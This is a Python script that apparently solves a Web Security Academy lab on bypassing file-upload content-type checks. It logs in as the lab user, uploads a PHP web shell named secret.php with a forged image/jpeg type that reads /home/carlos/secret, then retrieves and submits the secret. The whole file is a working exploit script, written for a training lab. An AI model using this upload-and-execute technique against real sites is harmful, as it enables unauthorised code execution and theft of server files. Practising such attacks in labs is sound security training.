import requests
from bs4 import BeautifulSoup
import re

site = "0a870098044575a3820ae7e5001100fc.web-security-academy.net"
base_url = f"https://{site}"
login_url = f"{base_url}/login"
account_url = f"{base_url}/my-account"
avatar_url = f"{base_url}/my-account/avatar"
webshell_url = f"{base_url}/files/avatars/secret.php"
submit_url = f"{base_url}/submitSolution"

# Step 1: Start session and get CSRF token for login
s = requests.Session()
resp = s.get(login_url)
csrf_login = re.search(r'name="csrf" value="([^"]+)"', resp.text).group(1)

# Step 2: Log in with known credentials
login_data = {"csrf": csrf_login, "username": "wiener", "password": "peter"}
s.post(login_url, data=login_data)

# Step 3: Fetch /my-account to extract new CSRF token for avatar upload
resp = s.get(account_url)
csrf_avatar = re.search(r'name="csrf" value="([^"]+)"', resp.text).group(1)

# Step 4: Upload malicious PHP script pretending to be a JPEG
multipart_form_data = {
    "csrf": (None, csrf_avatar),
    "user": (None, "wiener"),
    "avatar": ("secret.php", "<?php echo file_get_contents('/home/carlos/secret'); ?>", "image/jpeg")
}
upload_resp = s.post(avatar_url, files=multipart_form_data)
print("[*] Upload response:\n", upload_resp.text)

# Step 5: Visit the uploaded script to extract the secret
resp = s.get(webshell_url)
secret = resp.text.strip()
print(f"[✓] Retrieved secret: {secret}")

# Step 6: Submit the secret to complete the lab
s.post(submit_url, data={"answer": secret})
final_check = s.get(base_url)

if "Congratulations" in final_check.text:
    print("[✓] Lab solved via content-type restriction bypass.")
else:
    print("[!] Upload succeeded, but lab not marked as solved yet.")
